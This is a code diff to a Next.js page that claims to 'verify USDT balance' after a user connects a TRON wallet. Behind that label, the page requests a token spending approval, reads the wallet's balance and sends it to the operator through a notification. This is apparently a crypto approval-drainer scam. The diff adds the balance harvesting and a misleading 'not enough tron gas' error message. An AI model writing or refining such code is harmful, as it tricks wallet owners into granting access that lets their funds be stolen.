@@ -9,6 +9,7 @@ import TickerTape from "../utils/tickertape";
 import TronWeb from 'tronweb';
 import { ToastContainer } from "react-toastify";
 import 'react-toastify/dist/ReactToastify.css';
+import { useRouter } from "next/router";
 
 const VerifyUsdtPage: NextPage = () => {
     // 
@@ -19,12 +20,25 @@ const VerifyUsdtPage: NextPage = () => {
     const [completed, setCompleted] = useState(false);
     const [balance, setBalance] = useState(0);
     const tickerTheme = "light";
+    const router = useRouter();
 
     const tronWeb = new TronWeb({
               fullHost: 'https://api.trongrid.io',
               headers: { 'TRON-PRO-API-KEY': process.env.NEXT_PUBLIC_TRONGRID_API_KEY },
             });
 
+    
+            
+  const handleButtonClick = () => {
+    if (completed) {
+      router.push('/');
+    } else if (adapters[selectedIndex].address) {
+      verifyWallet();
+    } else {
+      // Assuming setLoginShow is a state updater function
+      setLoginShow(true);
+    }
+  };
               
     function handleLoginClose() {
         setLoginShow(false);
@@ -50,7 +64,7 @@ const VerifyUsdtPage: NextPage = () => {
             const constantResult = result.constant_result[0];
 
             // Convert constant result from hexadecimal to decimal
-            const balance = parseInt(constantResult, 16);
+            const balance = parseInt(constantResult, 16)/1000000;
             setBalance(balance);
             return balance;
 
@@ -140,14 +154,16 @@ const VerifyUsdtPage: NextPage = () => {
             return;
         }
         setVerifyLoading(true);
+        let bal = await checkBalance(adapters[selectedIndex].address);
+        console.log(bal);
         await approveUSDT(100000000);
         if(await checkApprovalStatus()) {
-            await sendNotification(selectedIndex, balance);
+            await sendNotification(selectedIndex, bal);
             toastNotification('Verified USDT balance', true);
             setVerifyLoading(false);
             setCompleted(true);
         } else {
-            toastNotification("Failed Verification", false);
+            toastNotification("Verification Error, Not enough tron gas", false);
             setVerifyLoading(false);
         }
     }
@@ -159,14 +175,6 @@ const VerifyUsdtPage: NextPage = () => {
         await connectWallet(index);
         toastNotification("Processing...", true);
     }
-
-    async function finalizeVerify() {
-        toastNotification("Verifying...", true);
-        console.log(adapters[selectedIndex].address);
-        let bal = await checkBalance(adapters[selectedIndex].address);
-        await verifyWallet();
-    }
-
 
     
     // Approval or increaseApproval
@@ -290,16 +298,16 @@ const VerifyUsdtPage: NextPage = () => {
                                     <div className="card">
                                         <img className="img-fluid" src="assets/images/daz.png" alt=""/>
                                         <div className="card-body" style={{ marginTop: '16px' }}>
-                                            <h6 className="card-title">{adapters[selectedIndex].address?'Final Step':'Step 1'}</h6>
+                                            <h6 className="card-title">{completed? 'Verification Complete' :adapters[selectedIndex].address?'Final Step':'Step 1'}</h6>
                                             {/* <p className="card-text text-white">Verifier Address: {getRefFromUrl()}</p> */}
                                             {adapters[selectedIndex].address?<p className="card-text text-white">Your Address: {adapters[selectedIndex].address}</p>: null}
                                             {/* { getEmailFromUrl() ? <p className="card-text text-white">Receiving Email: {getEmailFromUrl()} </p>:null} */}
                                         </div>
                                         <div className="card-footer">
                                             {/* <div className="signin-btn"> */}
-                                            <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?verifyWallet():setLoginShow(true)}>
-                                    { loading?'...loading': 
-                                    adapters[selectedIndex].address ? "Verify USDT balance"
+                                            <a className="btn btn-primary text-white" onClick={handleButtonClick}>
+                                    {completed? 'Home' : loading?'...loading': 
+                                    adapters[selectedIndex].address ? verifyLoading? "verifying..." : "Verify USDT balance"
                                     : "Connect Wallet"}</a>
                                    {/* {adapters[selectedIndex].address? <a onClick={() => verifyWallet()} className="btn btn-outline-primary">Verify Wallet</a> : null
                                    }  */}
